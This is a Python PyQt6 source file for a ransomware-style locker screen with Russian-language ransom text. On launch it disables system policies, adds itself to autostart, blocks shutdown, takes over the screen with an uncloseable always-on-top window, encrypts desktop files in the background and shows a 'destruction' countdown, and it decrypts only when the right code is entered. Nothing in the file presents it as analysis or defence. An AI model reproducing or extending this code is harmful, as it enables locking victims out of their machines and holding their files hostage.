import os
import random
import string
import time
import threading
import winsound
from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QLabel, QLineEdit, 
                             QHBoxLayout, QFrame, QGraphicsDropShadowEffect)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal
from PyQt6.QtGui import QPixmap, QColor, QFont, QPainter

from core.crypto import CryptoManager
from core.sys_tools import set_policies, set_autostart, block_shutdown

class MatrixRain(QThread):
    update_signal = pyqtSignal()
    def __init__(self):
        super().__init__()
        self.running = True
    def run(self):
        while self.running:
            self.update_signal.emit()
            time.sleep(0.04)
    def stop(self):
        self.running = False
        self.wait()

class LockerScreen(QWidget):
    def __init__(self, config):
        super().__init__()
        self.config = config
        self.crypto = CryptoManager(config['password'])
        
        # Включаем защиту
        set_policies(False)
        set_autostart(True, config['app_name'])
        block_shutdown(True)
        
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.WindowStaysOnTopHint | Qt.WindowType.Tool)
        self.showFullScreen()
        self.setStyleSheet("background-color: #050505;")
        
        self.matrix_drops = []
        self.matrix_font_size = 16
        self.matrix_chars = string.ascii_letters + string.digits + "@#$%&*!?"
        self.init_matrix()
        self.matrix_thread = MatrixRain()
        self.matrix_thread.update_signal.connect(self.update_matrix)
        self.matrix_thread.start()

        self.main_layout = QHBoxLayout(self)
        self.main_layout.setContentsMargins(50, 50, 50, 50)
        self.main_layout.setSpacing(50)

        # ЛЕВАЯ ЧАСТЬ
        self.left_widget = QWidget()
        self.left_layout = QVBoxLayout(self.left_widget)
        self.left_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.img_left = QLabel()
        
        logo_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "logo.png")
        self.original_pixmap = QPixmap(logo_path)
        if not self.original_pixmap.isNull():
            self.img_left.setPixmap(self.original_pixmap.scaled(350, 350, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
        self.left_layout.addWidget(self.img_left)
        self.main_layout.addWidget(self.left_widget, 1)

        # ЦЕНТР
        self.center_widget = QWidget()
        self.center_layout = QVBoxLayout(self.center_widget)
        self.center_layout.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.black_box = QFrame()
        self.black_box.setFixedSize(700, 420)
        self.black_box.setStyleSheet("QFrame { background-color: #000000; border: 3px solid #ffffff; border-radius: 5px; }")
        
        shadow = QGraphicsDropShadowEffect()
        shadow.setBlurRadius(50)
        shadow.setColor(QColor(255, 0, 0, 150))
        self.black_box.setGraphicsEffect(shadow)

        self.box_layout = QVBoxLayout(self.black_box)
        self.box_layout.setContentsMargins(20, 20, 20, 20)
        self.box_layout.setSpacing(15)

        self.lbl_title = QLabel("ВАШ РАБОЧИЙ СТОЛ ЗАШИФРОВАН!")
        self.lbl_title.setStyleSheet("background-color: #ff0000; color: white; font-family: 'Consolas'; font-size: 16px; font-weight: bold; border: 1px solid black; padding: 5px;")
        self.lbl_title.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.lbl_text = QLabel("ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ АЛГОРИТМОМ AES-256!\n\nВсе ваши документы, фото и базы данных на рабочем столе превратились в мусор.\n\nСистемные утилиты и выключение ПК заблокированы.")
        self.lbl_text.setWordWrap(True)
        self.lbl_text.setStyleSheet("color: white; font-family: 'Consolas'; font-size: 15px; background: transparent; border: none; line-height: 1.4;")
        self.lbl_text.setAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)

        self.timer_label = QLabel(f"ДО УНИЧТОЖЕНИЯ: {config['timer_hours']}:00:00")
        self.timer_label.setStyleSheet("color: #ff0000; font-family: 'Consolas'; font-size: 16px; font-weight: bold; background: transparent; border: none;")
        self.timer_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.seconds_left = config['timer_hours'] * 3600
        self.countdown_timer = QTimer(self)
        self.countdown_timer.timeout.connect(self.update_timer)
        self.countdown_timer.start(1000)

        self.box_layout.addWidget(self.lbl_title)
        self.box_layout.addWidget(self.lbl_text)
        self.box_layout.addStretch()
        self.box_layout.addWidget(self.timer_label)

        self.lbl_enter = QLabel("Введите код разблокировки:")
        self.lbl_enter.setStyleSheet("color: #aaaaaa; font-family: 'Consolas'; font-size: 16px; background: transparent; border: none;")
        self.lbl_enter.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.entry = QLineEdit()
        self.entry.setEchoMode(QLineEdit.EchoMode.Password)
        self.entry.setFixedHeight(45)
        self.entry.setStyleSheet("QLineEdit { background-color: #000000; color: #ffffff; border: 2px solid #555555; font-family: 'Consolas'; font-size: 18px; padding: 5px 10px; border-radius: 3px; } QLineEdit:focus { border: 2px solid #ffffff; background-color: #111111; }")
        self.entry.returnPressed.connect(self.check_password)

        self.msg = QLabel("")
        self.msg.setStyleSheet("color: #ff4d6d; font-family: 'Consolas'; font-size: 16px; font-weight: bold; background: transparent; border: none;")
        self.msg.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.box_layout.addWidget(self.lbl_enter)
        self.box_layout.addWidget(self.entry)
        self.box_layout.addWidget(self.msg)

        self.center_layout.addWidget(self.black_box)
        self.main_layout.addWidget(self.center_widget, 2)

        self.right_widget = QWidget()
        self.main_layout.addWidget(self.right_widget, 1)

        self.entry.setFocus()
        
        # Запуск шифрования в фоне
        threading.Thread(target=self.crypto.encrypt_all, daemon=True).start()

    def closeEvent(self, event):
        event.ignore()

    def init_matrix(self):
        self.matrix_drops = [random.randint(-1000, 0) for _ in range(int(self.width() / 20))]

    def update_matrix(self):
        for i in range(len(self.matrix_drops)):
            self.matrix_drops[i] += random.randint(10, 25)
            if self.matrix_drops[i] > self.height():
                self.matrix_drops[i] = random.randint(-300, 0)
        self.update()

    def update_timer(self):
        if self.seconds_left > 0:
            self.seconds_left -= 1
            h, m, s = self.seconds_left // 3600, (self.seconds_left % 3600) // 60, self.seconds_left % 60
            self.timer_label.setText(f"ДО УНИЧТОЖЕНИЯ: {h:02d}:{m:02d}:{s:02d}")

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setFont(QFont("Consolas", self.matrix_font_size, QFont.Weight.Bold))
        for i, y in enumerate(self.matrix_drops):
            x = i * 20
            for j in range(6):
                char_y = y - (j * 18)
                if 0 < char_y < self.height():
                    alpha = max(0, 255 - (j * 40))
                    painter.setPen(QColor(255, 0, 0, alpha))
                    painter.drawText(x, int(char_y), random.choice(self.matrix_chars))

    def check_password(self):
        if self.entry.text() == self.config['password']:
            self.msg.setStyleSheet("color: #00ff00; font-family: 'Consolas'; font-size: 16px;")
            self.msg.setText("ПАРОЛЬ ВЕРНЫЙ. ИДЕТ РАСШИФРОВКА...")
            self.entry.setEnabled(False)
            self.countdown_timer.stop()
            
            def do_decrypt():
                self.crypto.decrypt_all()
                set_policies(True)
                set_autostart(False, self.config['app_name'])
                block_shutdown(False)
                QTimer.singleShot(0, self.close_app)
            threading.Thread(target=do_decrypt, daemon=True).start()
        else:
            winsound.MessageBeep(winsound.MB_ICONHAND)
            self.msg.setStyleSheet("color: #ff4d6d; font-family: 'Consolas'; font-size: 16px;")
            self.msg.setText("НЕВЕРНЫЙ КОД! ФАЙЛЫ ОСТАЮТСЯ ЗАШИФРОВАННЫМИ!")
            self.entry.clear()

    def close_app(self):
        self.matrix_thread.stop()
        QApplication.quit()